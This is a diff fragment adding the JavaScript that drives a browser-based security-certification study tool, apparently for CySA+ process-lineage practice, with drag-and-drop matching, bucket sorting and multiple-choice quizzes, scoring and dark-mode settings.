+function homeChip(c){const home=document.getElementById(c.dataset.home)||$('#bank');if(home)home.appendChild(c);c.classList.remove('correct','wrong','selected')}
+function bindDrop(el,acceptFn,placeFn){
+ el.addEventListener('dragover',e=>{e.preventDefault();el.classList.add('over')});el.addEventListener('dragleave',()=>el.classList.remove('over'));
+ el.addEventListener('drop',e=>{e.preventDefault();el.classList.remove('over');const c=document.getElementById(e.dataTransfer.getData('text/plain'));if(c&&acceptFn(c)){placeFn(c);clearGradeStyles()}});
+ el.addEventListener('click',e=>{if(e.target!==el&&e.target.closest('.chip'))return;const c=state.selectedChip;if(c&&acceptFn(c)){placeFn(c);clearSelection();clearGradeStyles()}})
+}
+function feedback(right,total,placed,extra=''){
+ const f=$('#feedback');if(!f)return;const un=total-placed;f.classList.add('show');f.innerHTML=`<span class="big">${right} of ${total} correct.</span> ${un?`${un} unanswered/unplaced. `:''}${right===total?'✅ Perfect.':'Green = correct; red = wrong. Move anything and Score / Re-score again.'}${extra?`<div style="margin-top:7px">${extra}</div>`:''}`
+}
+function renderMatch(){
+ const d=setDef();state.current=nextItems();const host=$('#quizHost');host.innerHTML=`<div class="instructions"><b>Normal first.</b> Drag each lineage/role description to the correct process. Click a placed answer to return it home. You can grade incomplete work, change it, and re-score.</div><div class="workspace"><div class="stage"><div class="match-grid" id="matchGrid"></div><div class="controls"><button class="primary" id="gradeBtn">Score / Re-score</button><button id="newBtn">New Set</button><button id="shuffleBtn">Shuffle Tray</button><button class="danger" id="coverageBtn">Reset Coverage</button></div><div class="feedback" id="feedback"></div></div><div class="tray"><h3>Lineage / role descriptions</h3><div class="small">Drag, or click a description then click a drop zone.</div><div class="bank" id="bank"></div></div></div>`;
+ const grid=$('#matchGrid'),bank=$('#bank');for(const item of state.current){const row=document.createElement('div');row.className='match-row';row.innerHTML=`<div class="term">${item.term}</div><div class="dropzone" data-expected="${item.id}"></div>`;const z=$('.dropzone',row);bindDrop(z,c=>c.dataset.mode==='match',c=>{const old=$('.chip',z);if(old)homeChip(old);z.appendChild(c)});grid.appendChild(row)}
+ for(const item of shuffle(state.current)){bank.appendChild(mkChip(item,item.def,item.id,'match','bank'))}
+ $('#gradeBtn').onclick=()=>{let right=0,placed=0;$$('.dropzone').forEach(z=>{const c=$('.chip',z);if(!c)return;placed++;const ok=c.dataset.answer===z.dataset.expected;c.classList.toggle('correct',ok);c.classList.toggle('wrong',!ok);if(ok)right++});state.checks++;state.lastScore=right;state.lastTotal=state.current.length;updateHeader();feedback(right,state.current.length,placed)};
+ $('#newBtn').onclick=()=>{clearSelection();renderQuiz()};$('#shuffleBtn').onclick=()=>shuffle($$('.chip',bank)).forEach(c=>bank.appendChild(c));$('#coverageBtn').onclick=resetCoverage;
+}
+function renderBucket(){
+ const d=setDef();state.current=nextItems();const host=$('#quizHost');host.innerHTML=`<div class="instructions">Drag each card into the best bucket. The scenario wording is intentionally concrete so the answer turns on <b>context</b>, not on memorizing fake malware names.</div><div class="workspace"><div class="stage"><div class="bucket-grid" id="bucketGrid"></div><div class="controls"><button class="primary" id="gradeBtn">Score / Re-score</button><button id="newBtn">New Set</button><button id="shuffleBtn">Shuffle Tray</button><button class="danger" id="coverageBtn">Reset Coverage</button></div><div class="feedback" id="feedback"></div></div><div class="tray"><h3>Process cards</h3><div class="small">Drag, or click a card then click a bucket. Click a placed card to send it home.</div><div class="bank" id="bank"></div></div></div>`;
+ const bg=$('#bucketGrid'),bank=$('#bank');for(const [key,hint] of d.buckets){const b=document.createElement('div');b.className='bucket';b.dataset.key=key;b.innerHTML=`<h3>${key}</h3><div class="hint">${hint}</div>`;bindDrop(b,c=>c.dataset.mode==='bucket',c=>b.appendChild(c));bg.appendChild(b)}
+ for(const item of shuffle(state.current))bank.appendChild(mkChip(item,item.term,item.bucket,'bucket','bank'));
+ $('#gradeBtn').onclick=()=>{let right=0,placed=0;$$('.bucket .chip').forEach(c=>{placed++;const ok=c.dataset.answer===c.parentElement.dataset.key;c.classList.toggle('correct',ok);c.classList.toggle('wrong',!ok);if(ok)right++});const wrong=state.current.filter(i=>{const c=$(`.chip[data-item-id="${i.id}"]`);return c&&c.parentElement?.classList.contains('bucket')&&c.dataset.answer!==c.parentElement.dataset.key});let extra='';if(wrong.length)extra='<b>Review:</b><ul>'+wrong.map(x=>`<li><b>${x.term}</b> — ${x.why||''}</li>`).join('')+'</ul>';state.checks++;state.lastScore=right;state.lastTotal=state.current.length;updateHeader();feedback(right,state.current.length,placed,extra)};
+ $('#newBtn').onclick=()=>{clearSelection();renderQuiz()};$('#shuffleBtn').onclick=()=>shuffle($$('.chip',bank)).forEach(c=>bank.appendChild(c));$('#coverageBtn').onclick=resetCoverage;
+}
+function renderMcq(){
+ const d=setDef();state.current=nextItems();state.mcqPick=null;const q=state.current[0],opts=shuffle(q.opts);const host=$('#quizHost');host.innerHTML=`<div class="instructions"><b>Exam mode.</b> Pick the BEST interpretation. The explanation focuses on the clue that should drive your choice.</div><div class="mcq-card"><div class="question">${q.q}</div><div class="options" id="options"></div><div class="controls"><button class="primary" id="gradeBtn">Check Answer</button><button id="newBtn">Next Question</button><button class="danger" id="coverageBtn">Reset Coverage</button></div><div class="explain" id="explain"></div></div>`;
+ const box=$('#options');opts.forEach(o=>{const b=document.createElement('button');b.className='opt';b.textContent=o;b.onclick=()=>{$$('.opt').forEach(x=>x.classList.remove('sel'));b.classList.add('sel');state.mcqPick=o};box.appendChild(b)});
+ $('#gradeBtn').onclick=()=>{if(!state.mcqPick)return;let right=0;$$('.opt').forEach(o=>{o.classList.remove('correct','wrong');if(o.textContent===q.a)o.classList.add('correct');else if(o.textContent===state.mcqPick)o.classList.add('wrong')});if(state.mcqPick===q.a)right=1;const ex=$('#explain');ex.classList.add('show');ex.innerHTML=`<b>${right?'Correct.':'Not quite.'}</b> ${q.why}`;state.checks++;state.lastScore=right;state.lastTotal=1;updateHeader()};
+ $('#newBtn').onclick=renderQuiz;$('#coverageBtn').onclick=resetCoverage;
+}
+function resetCoverage(){progress[state.quiz]=[];saveProgress();state.lastScore=0;state.lastTotal=0;clearSelection();renderQuiz()}
+function renderQuiz(){clearSelection();state.lastScore=0;state.lastTotal=0;updateHeader();const type=QUIZZES.find(x=>x.id===state.quiz).type;if(type==='match')renderMatch();else if(type==='bucket')renderBucket();else renderMcq();updateHeader()}
+function init(){
+ const s=$('#quizSelect');QUIZZES.forEach(q=>{const o=document.createElement('option');o.value=q.id;o.textContent=q.name;s.appendChild(o)});s.value=state.quiz;s.onchange=()=>{state.quiz=s.value;renderQuiz()};
+ $('#resetScoreBtn').onclick=()=>{state.checks=0;state.lastScore=0;state.lastTotal=0;updateHeader()};
+ $('#cheatBtn').onclick=()=>{document.body.classList.toggle('sidebar-hidden');$('#cheatBtn').textContent=document.body.classList.contains('sidebar-hidden')?'📚 Show Cheats':'📚 Hide Cheats'};
+ $('#darkBtn').onclick=()=>{document.body.classList.toggle('dark');$('#darkBtn').textContent=document.body.classList.contains('dark')?'☀️ Light':'🌙 Dark';try{localStorage.setItem('cysa-process-dark',document.body.classList.contains('dark')?'1':'0')}catch(e){}};
+ try{if(localStorage.getItem('cysa-process-dark')==='1'){document.body.classList.add('dark');$('#darkBtn').textContent='☀️ Light'}}catch(e){}
+ document.addEventListener('keydown',e=>{if(['INPUT','TEXTAREA','SELECT'].includes(e.target.tagName))return;if(e.key==='Enter')$('#gradeBtn')?.click();if(e.key==='n'||e.key==='N')$('#newBtn')?.click();if(e.key==='c'||e.key==='C')$('#cheatBtn').click()});
+ renderQuiz();
+}
+init();
+</script>
+</body>
+</html>
